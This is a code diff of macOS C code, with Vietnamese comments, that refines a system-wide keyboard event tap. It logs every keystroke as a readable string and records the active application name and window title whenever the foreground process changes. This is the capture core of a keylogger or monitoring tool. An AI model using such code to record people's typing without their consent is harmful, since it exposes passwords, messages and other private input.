@@ -19,27 +19,42 @@ CGEventRef keyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEven
         
         const char* keyString = keycode_to_string(keycode, flags);
         
+        // ƯU TIÊN: Gọi keyboard callback ngay lập tức
         if (ctx->keyboardCallback) {
             ctx->keyboardCallback(event, keyString);
         }
     }
     
-    // Kiểm tra thay đổi cửa sổ active
-    char currentAppName[256] = {0};
-    char currentWindowTitle[512] = {0};
-    get_active_window_info(currentAppName, sizeof(currentAppName), 
-                          currentWindowTitle, sizeof(currentWindowTitle));
+    // Window detection chỉ check nhanh (không block keyboard logging)
+    // Chỉ check PID thay đổi, không lấy full window info mỗi lần
+    static pid_t lastPID = 0;
+    ProcessSerialNumber psn = {0, kNoProcess};
+    pid_t currentPID = 0;
+    if (GetFrontProcess(&psn) == noErr) {
+        GetProcessPID(&psn, &currentPID);
+    }
     
-    // So sánh với cửa sổ trước đó
-    if (strcmp(currentAppName, lastAppName) != 0 || 
-        strcmp(currentWindowTitle, lastWindowTitle) != 0) {
+    // Chỉ check window khi PID thay đổi (nhanh hơn)
+    if (currentPID != lastPID) {
+        lastPID = currentPID;
         
-        if (ctx->windowChangeCallback) {
-            ctx->windowChangeCallback(currentAppName, currentWindowTitle);
+        // Chỉ lấy full window info khi thực sự cần
+        char currentAppName[256] = {0};
+        char currentWindowTitle[512] = {0};
+        get_active_window_info(currentAppName, sizeof(currentAppName), 
+                              currentWindowTitle, sizeof(currentWindowTitle));
+        
+        // So sánh với cửa sổ trước đó
+        if (strcmp(currentAppName, lastAppName) != 0 || 
+            strcmp(currentWindowTitle, lastWindowTitle) != 0) {
+            
+            if (ctx->windowChangeCallback) {
+                ctx->windowChangeCallback(currentAppName, currentWindowTitle);
+            }
+            
+            strncpy(lastAppName, currentAppName, sizeof(lastAppName) - 1);
+            strncpy(lastWindowTitle, currentWindowTitle, sizeof(lastWindowTitle) - 1);
         }
-        
-        strncpy(lastAppName, currentAppName, sizeof(lastAppName) - 1);
-        strncpy(lastWindowTitle, currentWindowTitle, sizeof(lastWindowTitle) - 1);
     }
     
     return event;
@@ -138,7 +153,21 @@ const char* keycode_to_string(CGKeyCode keycode, CGEventFlags flags) {
         strcat(keyString, "Cmd+");
     }
     
-    // Chuyển đổi keycode thành ký tự
+    // Xử lý các phím đặc biệt TRƯỚC khi translate (để tránh translate thành ký tự xóa)
+    switch (keycode) {
+        case 36: strcat(keyString, "Return"); return keyString;  // Return
+        case 48: strcat(keyString, "Tab"); return keyString;     // Tab
+        case 49: strcat(keyString, "Space"); return keyString; // Space
+        case 51: strcat(keyString, "Delete"); return keyString; // Backspace/Delete
+        case 117: strcat(keyString, "Delete"); return keyString; // Forward Delete
+        case 53: strcat(keyString, "Escape"); return keyString; // Escape
+        case 123: strcat(keyString, "Left"); return keyString;   // Left Arrow
+        case 124: strcat(keyString, "Right"); return keyString; // Right Arrow
+        case 125: strcat(keyString, "Down"); return keyString;  // Down Arrow
+        case 126: strcat(keyString, "Up"); return keyString;   // Up Arrow
+    }
+    
+    // Chuyển đổi keycode thành ký tự cho các phím thường
     TISInputSourceRef keyboardLayout = TISCopyCurrentKeyboardInputSource();
     CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(keyboardLayout, kTISPropertyUnicodeKeyLayoutData);
     
@@ -167,21 +196,8 @@ const char* keycode_to_string(CGKeyCode keycode, CGEventFlags flags) {
             strcat(keyString, charBuffer);
             CFRelease(stringRef);
         } else {
-            // Fallback: sử dụng keycode trực tiếp cho các phím đặc biệt
-            switch (keycode) {
-                case 36: strcat(keyString, "Return"); break;
-                case 48: strcat(keyString, "Tab"); break;
-                case 49: strcat(keyString, "Space"); break;
-                case 51: strcat(keyString, "Delete"); break;
-                case 53: strcat(keyString, "Escape"); break;
-                case 123: strcat(keyString, "Left"); break;
-                case 124: strcat(keyString, "Right"); break;
-                case 125: strcat(keyString, "Down"); break;
-                case 126: strcat(keyString, "Up"); break;
-                default:
-                    snprintf(keyString + strlen(keyString), sizeof(keyString) - strlen(keyString), "Key%d", keycode);
-                    break;
-            }
+            // Fallback: sử dụng keycode trực tiếp
+            snprintf(keyString + strlen(keyString), sizeof(keyString) - strlen(keyString), "Key%d", keycode);
         }
     }
     
